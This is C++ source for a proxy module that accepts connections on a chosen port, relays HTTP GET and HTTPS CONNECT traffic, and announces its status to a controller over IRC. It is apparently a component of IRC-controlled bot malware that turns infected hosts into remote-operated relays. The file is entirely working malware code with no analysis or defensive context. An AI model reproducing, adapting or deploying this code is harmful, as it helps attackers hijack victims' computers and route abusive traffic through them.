
#include "main.h"
#include "redir_https.h"
#include "mainctrl.h"
#include "utility.h"

/*
in internet explorer under
Tools|Internet Options..|Advanced
disable
Use HTTP 1.1 through proxy connections

in mozilla under
Edit|Preferences|Advanced|HTTP Networking|Proxy Connection Options
disable
Enable Keep-Alive
*/

CRedirectHTTPS_Thread::CRedirectHTTPS_Thread() { m_szType="CRedirectHTTPS_Thread"; m_sRedirectName.Assign("redirhttps"); }

void CRedirectHTTPS_Thread::StartRedirect()
{	m_sServerSocket=INVALID_SOCKET; m_iConnections=0;
	int iErr=1; bool bFinished=false; while(!bFinished && g_pMainCtrl->m_bRunning) {
		url uURL; char szBuffer[MAX_PATH]; bool bGet=false;

		// Receive the proxy request
		if(!m_sClientSocket.RecvLineIRC(szBuffer, MAX_PATH)) { bFinished=true; break; }
		CString sBuffer(szBuffer);
		// Fail if there is no url
		// if(!sBuffer.Token(1, " ").Compare("")) { bFinished=true; break; }

		if(!sBuffer.Compare("")) { bFinished=true; break; }

		if(!sBuffer.Token(0, " ").CompareNoCase("GET")) { // GET method
			bGet=true;
			// Parse the url
			if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) { bFinished=true; break; }
			// Fail if the protocol isnt http
			if(uURL.sProto.Compare("http")) { bFinished=true; break; }
		} else if(!sBuffer.Token(0, " ").CompareNoCase("CONNECT")) { // CONNECT method
			bGet=false;
			// Parse the host
			uURL.sProto.Assign("connect");
			uURL.sReq.Assign("");
			uURL.sHost.Assign(sBuffer.Token(1, " ").Token(0, ":"));
			if(!sBuffer.Token(1, " ").Token(1, ":").CStr()) { bFinished=true; break; }
			uURL.iPort=atoi(sBuffer.Token(1, " ").Token(1, ":").CStr());
			if(!uURL.iPort) uURL.iPort=80; }

		// Get the rest of the request
		CString sMethod(sBuffer.Token(0, " ")); if(!sMethod.Compare("")) { bFinished=true; break; }
		CString sHTTPSVer(sBuffer.Token(2, " ")); if(!sHTTPSVer.Compare("")) { bFinished=true; break; }
		CString sOldHost(uURL.sHost);

#ifdef DBGCONSOLE
		if(bGet)
			g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTPS(0x%8.8Xh): %s %s %s...\n", m_pRedirHTTPS, sMethod.CStr(), uURL.sReq.CStr(), sHTTPSVer.CStr());
		else
			g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTPS(0x%8.8Xh): %s %s:%d %s...\n", m_pRedirHTTPS, sMethod.CStr(), uURL.sHost.CStr(), uURL.iPort, sHTTPSVer.CStr());
#endif

		char szBuf[4096]; strcpy(szBuf, "bla");
		if(bGet) {
			if(!m_sClientSocket.Recv(szBuf, sizeof(szBuf)))
			{	m_sClientSocket.Disconnect(); return; }
		} else {
			while(strcmp(szBuf, "")) // Loop while headers arent finished
				if(!m_sClientSocket.RecvLineIRC(szBuf, 4096)) { bFinished=true; break; }
			if(bFinished) break; }

		CString sReqBuf;
		if(bGet)
			sReqBuf.Format("%s %s %s\r\n%s", sMethod.CStr(), uURL.sReq.CStr(), sHTTPSVer.CStr(), szBuf);
		else
			sReqBuf.Format("HTTP/1.0 200 Connection established\r\n\r\n");

		m_sServerSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(!m_sServerSocket.IsConnected())
		{	m_sClientSocket.Disconnect(); return; }

		// Connect to the server
		if(!m_sServerSocket.Connect(uURL.sHost.CStr(), uURL.iPort)) // Connect failed, exit
		{	
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTPS(0x%8.8Xh): Cannot connect to %s:%d (%s)...\n", m_pRedirHTTPS, uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr());
#endif
			m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect(); return; }

		if(bGet) {
			if(!m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength()))
			{	m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect(); return; }
		} else {
			if(!m_sClientSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength()))
			{	m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect(); return; }
		}

		int iLen; fd_set fd;
		SET_SOCK_BLOCK(m_sClientSocket.GetSocket(), 0);
		SET_SOCK_BLOCK(m_sServerSocket.GetSocket(), 0);

		if(bGet) {
			while(true)
			{	memset(szBuffer, 0, sizeof(szBuffer));
				if(!m_sClientSocket.RecvLineIRC(szBuffer, sizeof(szBuffer))) { Sleep(10); break; }
				if(strcmp(szBuffer, "")) {
					sBuffer.Assign(szBuffer);
					if(!sBuffer.Token(0, " ").Compare("GET"))
					{	// Fail if there is no url
						if(!sBuffer.Token(1, " ").Compare("")) { bFinished=true; break; }
						// Parse the url
						if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) break;
						// Fail if the protocol isnt http
						if(uURL.sProto.Compare("http")) { bFinished=true; break; }
						// Get the rest of the request
						CString sMethod(sBuffer.Token(0, " ")); if(!sMethod.Compare("")) { bFinished=true; break; }
						CString sHTTPSVer(sBuffer.Token(2, " ")); if(!sHTTPSVer.Compare("")) { bFinished=true; break; }
						sBuffer.Format("%s %s %s\r\n", sMethod.CStr(), uURL.sReq.CStr(), sHTTPSVer.CStr());
						if(uURL.sHost.Compare(sOldHost))
						{	m_sServerSocket.Disconnect();

							if(!m_sServerSocket.Connect(uURL.sHost.CStr(), uURL.iPort)) // Connect failed, exit
							{	
#ifdef DBGCONSOLE
								g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTPS(0x%8.8Xh): Cannot connect to %s:%d (%s)...\n", m_pRedirHTTPS, uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr());
#endif
								m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect(); return; }
							
							sOldHost.Assign(uURL.sHost); }
					}
					else
					{	sBuffer.Append("\r\n"); }
				if(!m_sServerSocket.Write(sBuffer.CStr(), sBuffer.GetLength())) break; }

				m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iLen);
				if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
				m_sClientSocket.Write(szBuf, iLen);
			}
		} else {
			while(true) {
				m_sClientSocket.Recv(szBuf, sizeof(szBuf), &iLen);
				if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
				m_sServerSocket.Write(szBuf, iLen);

				m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iLen);
				if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
				m_sClientSocket.Write(szBuf, iLen);
			}
		}

		m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect();
		bFinished=true;
	}
}

CRedirectHTTPS::CRedirectHTTPS() { m_szType="CRedirectHTTPS"; m_sRedirectName.Assign("redirhttps"); }

void CRedirectHTTPS::HTTPSProxy() {
	if(!m_sListenSocket.Bind(m_iLocalPort)) return;

	while(m_pRedirect->m_bRedirecting && g_pMainCtrl->m_bRunning) {
		CSocket sClientSocket(true);
		if(!m_sListenSocket.Accept(sClientSocket)) break;

		CRedirectHTTPS_Thread *pTemp=new CRedirectHTTPS_Thread;
		pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirHTTPS=this;
		pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_sClientSocket=sClientSocket;
		pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
		pTemp->Start(true);
	}

	m_sListenSocket.Disconnect(); }

void CRedirectHTTPS::StartRedirect()
{	if(m_bUseSSL)
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d, using ssl.", \
									  m_sRedirectName.CStr(), m_iLocalPort);
	else
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d.", \
									  m_sRedirectName.CStr(), m_iLocalPort);

	HTTPSProxy();	
	
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: finished proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort); }
